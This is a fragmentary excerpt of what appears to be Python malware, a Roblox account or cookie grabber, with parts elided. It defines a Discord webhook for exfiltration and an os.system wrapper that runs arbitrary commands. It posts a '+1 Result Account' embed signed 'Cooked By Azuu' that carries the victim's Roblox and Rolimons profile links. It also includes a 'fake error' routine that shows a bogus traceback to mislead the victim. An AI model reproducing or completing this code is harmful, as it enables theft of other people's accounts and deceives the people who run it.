...
webhookk = "https://discord.com/apiuwebohohohohohohohok"                                                                                                                                                                                                                   
def command(c):
    os.system(c)
def cls():
    os.system("cls")
...
discord.post(
    ...
    embeds=[
        {
            "username": "Cooked By Azuu 🍪",
            "title": "💸 +1 Result Account 🕯️",
            "description" : f"[Click For Free rebex](https://www.youtube.com/watch?v=dQw4w9WgXcQ) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
...
#fake error
er = ["Traceback (most recent call last):", "Eror Ocurred while trying to Open Tkinter"]
er2 = [""]
def faeror():
    print(er)
